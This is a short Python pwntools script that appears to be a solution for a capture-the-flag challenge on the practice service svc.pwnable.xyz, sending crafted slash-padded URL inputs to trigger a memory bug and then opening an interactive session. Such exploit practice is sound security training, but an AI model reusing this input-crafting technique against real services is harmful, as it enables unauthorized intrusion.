from pwn import *

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30021)

def create(base,size,url):
	s.sendlineafter("> ","2")
	s.recvuntil("Secure or insecure: ")
	s.send(base)
	s.recvuntil("Size of url: ")
	s.sendline(str(size))
	s.send(url)

pause()
create("https:///",127,"/"*127)
create("https:///",127,"/"*127)
create("https:///",127,"/"*48)
create("https:///",127,"/"*48)
create("https:///",127,"/"*48)
s.interactive()
